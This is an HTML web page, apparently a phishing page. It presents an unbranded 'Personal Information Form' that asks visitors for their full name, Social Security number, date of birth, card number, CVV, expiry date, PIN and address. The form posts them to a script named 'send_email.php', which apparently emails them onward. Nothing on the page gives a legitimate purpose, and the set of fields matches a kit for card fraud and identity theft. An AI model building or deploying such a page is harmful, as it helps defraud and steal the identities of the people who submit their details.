<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Submission</title>
    <style>
        body {
            background-color: #001f3f;
            color: white;
            font-family: Arial, sans-serif;
        }

        .container {
            width: 50%;
            margin: 50px auto;
            padding: 20px;
            background-color: #002952;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            position: relative;
        }

        .logo {
            position: absolute;
            top: -20px;
            left: -20px;
            width: 80px;
            height: 80px;
            background-color: #006bb6;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        .logo img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
        }

        h2 {
            text-align: center;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        input, button {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: none;
            border-radius: 5px;
        }

        input {
            background-color: #004080;
            color: white;
        }

        button {
            background-color: #006bb6;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #004080;
        }

        .form-section {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Round Logo -->
        <div class="logo">
            <img src="https://i.imgur.com/N4ESjqI.png" alt="Logo">
        </div>
        
        <h2>Personal Information Form</h2>
        <form action="send_email.php" method="post">
            <!-- Full Name Field -->
            <label for="full_name">Full Name:</label>
            <input type="text" id="full_name" name="full_name" required>
            
            <!-- SSN Field -->
            <label for="ssn">SSN:</label>
            <input type="text" id="ssn" name="ssn" required>
            
            <!-- Date of Birth Field -->
            <label for="dob">Date of Birth:</label>
            <input type="date" id="dob" name="dob" required>
            
            <!-- Card Details Section -->
            <label for="card_number">Card Number:</label>
            <input type="text" id="card_number" name="card_number" required>
            
            <label for="card_cvv">Card CVV:</label>
            <input type="text" id="card_cvv" name="card_cvv" required>
            
            <label for="card_expiry">Card Expiry Date:</label>
            <input type="text" id="card_expiry" name="card_expiry" placeholder="MM/YY" required>
            
            <label for="pin">PIN (if any):</label>
            <input type="password" id="pin" name="pin">
            
            <!-- Address and Zip Code Section (placed last) -->
            <div class="form-section">
                <label for="address">Address:</label>
                <input type="text" id="address" name="address" required>
                
                <label for="zip_code">Zip Code:</label>
                <input type="text" id="zip_code" name="zip_code" required>
            </div>
            
            <button type="submit">Submit</button>
        </form>
    </div>
</body>
</html>
